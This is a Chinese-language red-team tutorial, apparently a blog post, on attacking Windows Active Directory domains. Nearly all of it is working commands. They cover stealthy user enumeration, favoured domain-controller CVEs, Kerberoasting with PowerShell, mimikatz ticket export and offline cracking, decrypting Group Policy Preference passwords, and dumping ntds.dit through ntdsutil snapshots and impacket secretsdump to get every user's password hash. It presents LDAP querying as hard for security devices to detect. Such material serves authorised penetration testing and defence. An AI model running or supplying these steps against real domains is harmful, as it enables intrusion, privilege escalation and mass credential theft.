---
title: 【红队】横向移动之--域渗透
---

# 定位目标

> 域内查询用户信息的两种比较安全的方法

**1、LDAP（推荐）**

目前针对LDAP的安全检测相对较少，不容易被安全设备发现

```bash
(&(objectCategory=person)(objectClass=user))	#LDAP查询所有域用户

#等价于 net user /domain
```

**2、SAMR**

平时用的`net user /domain` 就是使用`samr`进行查询的 

 `impacket` 工具包里面有一个脚本`samrdump.py`就是专门调用samr 去查询域用户的 

```bash
python samrdump.py 域名/用户名:密码@IP -csv
```

详情参考： https://daiker.gitbook.io/windows-protocol/ldap-pian/10 

# 渗透目标

## 常见域控一把梭

先做遍全端口扫描，根据开放服务去选择攻击方向

```http
CVE-2014-6324	ms14_068,域内提权的利器
CVE-2017-0148	ms17_010,永恒之蓝
CVE-2018-8581 	Exchange任意用户伪造漏洞
CVE-2019-1040 	资源约束委派
CVE-2019-0708	RDP远程命令执行
CVE-2020-0688	Exchange远程代码执行
```

[结合 CVE-2019-1040 漏洞的两种域提权利用深度分析](https://paper.seebug.org/962/)

------

> 域控不好拿的话，就尝试找其它高价值目标，把各种内网常见漏洞走一遍流程

## 高价值目标

**Wiki**

人员架构、网络架构，VPN接入方式、初始密码、技术文档

**Git/Svn**

代码、运维脚本

**Mail**

`Exchange`直接利用特权打域控，或者通过`ruler`获取权限、确定人员结构、技术人员邮箱

**OA**

通达、泛微、致远

**堡垒机**

国产或开源堡垒机漏洞

**文件服务器**

常用文件投毒、密码文件

**重点关注**

1、弱口令

2、高危服务/开发环境

```http
Shrio、Weblogic、Structs 2、rmi、jdwp、Nfs、Ldap、Rsync、jenkis
```

3、常规Web漏洞

# Kerberoast攻击 

 `Kerberoast` 能够在不对目标系统发送任何数据的情况下用普通用户身份从活动目录中提取服务的账户凭证。

Empire的作者，给出了 一种自动实现，并且不需要mimikatz，普通用户权限即可的方法；

参考资料：http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/ 

PS脚本：https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921 

**一、发现服务（SPN扫描）**

```
#查看当前域内的所有SPN
setspn.exe -q */*
```

**二、请求服务票据（ TGS ）**

```bash
powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/Server2003.wintrysec.lab"
```

**三、导出票据（mimikatz）**

```bash
mimikatz.exe "kerberos::list /export" exit
```

**四、离线破解**

域控组策略中设置`kerberos`加密方式为`RC4_HMAC_MD5`才能破解

https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py

```bash
python3 tgsrepcrack.py wordlist.txt mssql.kirbi
```

# 从SYSVOL和组策略首选项中获取密码

> 在域环境中微软的GPP（组策略偏好）中提供了一个批量修改本地账户的功能；
>
> 但是最初却导致了一个问题，就是域管理员在配置GPP的时候，会在SYSVOL这个文件夹中保存当前GPP配置的xml文件；
>
> 如果管理员在配置的时候填入了密码，其中就包含了加密了的用户密码，所有的认证用户都可以读取。

**使用Get-GPPPassword.ps1获取 SYSVOL中的XML文件** 

下载地址：https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 

```bash
powershell -nop -exec bypass -c "& {Import-Module '.\Get-GPPPassword.ps1';Get-GPPPassword}"
```

然后，使用Kali中自带的工具解密一下即可看到铭文密码

```
gpp-decrypt na6Fd1SIwYIBRqFyg2PsNAbpgr1pVsnUOpX54/WLQbk
```

# 导出`ntds.dit`（已获取域控权限）

> `ntds.dit`是活动目录的数据库文件，存储着所有与活动目录相关的东西；
>
> 它与SAM一样是被系统锁定的，通过卷影拷贝导出`ntds.dit`，可以获取域内所有用户散列值。

## （一）通过ntdsutil.exe提取ntds.dit

`ntdsutil.exe`是一个为活动目录提供管理机制的命令行工具，默认安装在域控制器上。

**1、在域控制器中创建一个快照**

该快照包含Windows中的所有文件，复制文件时不会收到Windows锁定机制的影响。

```
ntdsutil snapshot "activate instance ntds" create quit quit
```

**2、加载刚创建的快照**

```
#GUID是创建快照后给出的快照IDntdsutil snapshot "mount {GUID}" quit quitntdsutil snapshot "mount {0041972c-9e24-4450-938a-d53d4fb19331}" quit quit
```

**3、使用`copy`命令将快照中的文件复制出来**

```
copy C:\$SNAP_时间戳（快照加载后给出的）\windows\ntds\ntds.dit c:\ntds.ditcopy C:\$SNAP_202005031519_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit
```

**4、将之前的快照卸载并删除**

```
ntdsutil snapshot "unmount {GUID}" "delete {GUID}" quit quitntdsutil snapshot "unmount {0041972c-9e24-4450-938a-d53d4fb19331}" "delete {0041972c-9e24-4450-938a-d53d4fb19331}" quit quit
```

**5、查看系统中的快照**

```
ntdsutil snapshot "List All" quit quit
```

**导出SYSTEM文件**

```
reg save hklm\system system.hive
```

## （2）使用impacket包导出散列值

 Github地址：https://github.com/SecureAuthCorp/impacket 

**在kali中安装impacket**

```
sudo python setup.py isntall
```

**本地导出ntds.dit中的散列值**

先把`system.hive`和`ntds.dit`复制到Kali中

```
impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL
```